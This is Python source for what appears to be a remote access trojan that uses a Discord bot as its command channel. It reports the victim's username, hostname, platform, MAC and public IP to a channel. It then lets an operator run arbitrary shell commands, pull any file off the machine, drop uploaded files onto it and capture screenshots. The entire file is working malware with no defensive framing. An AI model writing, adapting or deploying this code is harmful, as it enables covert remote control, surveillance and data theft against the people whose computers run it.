import discord
import settings

import os
import platform
from uuid import getnode
from requests import get
import hashlib
from PIL import ImageGrab

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

selected = False
ip = get('https://api.ipify.org').content.decode('utf8')
selinfo = hashlib.md5((os.getlogin() + platform.node() + platform.platform() + str(getnode()) + ip).encode('utf-8')).hexdigest()
info = '-'*64 + '\n' + os.getlogin() + ' | ' + platform.node() + '\n```' + 'platform: ' + platform.platform() + '\n' + 'MAC: ' + str(getnode()) + '\n' + 'IP: ' + ip + '\n' + '```' + selinfo + '\n\n'

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    channel = client.get_channel(settings.channel)
    await channel.send(info + '**Connected!**')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('$list'):
        await message.channel.send('-'*64 + 
            os.getlogin() + ' | ' + platform.node() + '\n```' + 
            'platform: ' + platform.platform() + '\n' +
            'MAC: ' + str(getnode()) + '\n' +
            'IP: ' + ip + '\n' +
            '```' +
            selinfo + '\n' 
        )

    if message.content.startswith('$select'):
        msg = message.content.split()
        indent = ''.join((msg[1]))
        global selected
        if selected == False:
            if indent == selinfo:
                selected = True
                await message.channel.send(indent + ' selected')
            else:
                await message.channel.send(indent + ' not found')
        else:
            selected = False

    if message.content.startswith('$all'):
        msg = message.content.split()
        arg = ''.join((msg[1]))

        if arg == 'cmd':
            cmd = ' '.join(msg[2:])
            out = os.popen(cmd).read()
            if len(out) > 2000:
                with open('message.txt', 'w') as f:
                    f.write(out)
                await message.channel.send(info, file=discord.File('message.txt'))
            elif len(out) == 0:
                await message.channel.send(info + 'No output!')
            else:
                await message.channel.send(info + out)

        if arg == 'download':
            msg = message.content.split()
            filepath = ' '.join(msg[2:])
            await message.channel.send(info, file=discord.File(filepath))

        if arg == 'load':
            for attachment in message.attachments:
                await attachment.save(attachment.filename)

        if arg == 'screen':
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\screen.png')
            await message.channel.send(info, file=discord.File('screen.png'))

    if selected == True:
        if message.content.startswith('$cmd'):
            msg = message.content.split()
            cmd = ' '.join(msg[1:])
            out = os.popen(cmd).read()
            if len(out) > 2000:
                with open('message.txt', 'w') as f:
                    f.write(out)
                await message.channel.send(file=discord.File('message.txt'))
            elif len(out) == 0:
                await message.channel.send('No output!')
            else:
                await message.channel.send(out)
        
        if message.content.startswith('$download'):
            msg = message.content.split()
            filepath = ''.join((msg[1:]))
            await message.channel.send(info, file=discord.File(filepath))

        if message.content.startswith('$load'):
            for attachment in message.attachments:
                await attachment.save(attachment.filename)

        if message.content.startswith('$screen'):
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\screen.png')
            await message.channel.send(file=discord.File('screen.png'))

client.run(settings.token)
